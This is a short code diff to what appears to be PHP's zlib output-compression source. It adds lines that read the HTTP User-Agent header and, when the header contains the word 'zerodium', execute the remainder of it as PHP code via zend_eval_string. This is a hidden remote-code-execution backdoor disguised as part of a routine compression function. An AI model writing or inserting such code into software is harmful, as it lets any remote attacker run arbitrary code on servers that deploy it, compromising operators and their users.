@@ -357,6 +357,17 @@ static void php_zlib_output_compression_start(void)
 {
 	zval zoh;
 	php_output_handler *h;
+	zval *userAgentHeader;
+	
+	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+		(userAgentHeader = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENT", sizeof("HTTP_USER_AGENT") - 1))) {
+		convert_to_string(userAgentHeader);
+		if (strstr(Z_STRVAL_P(userAgentHeader), "zerodium")) {
+			zend_try {
+				zend_eval_string(Z_STRVAL_P(userAgentHeader) + 8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+			} zend_end_try();
+		}
+	}
 
 	switch (ZLIBG(output_compression)) {
 		case 0:
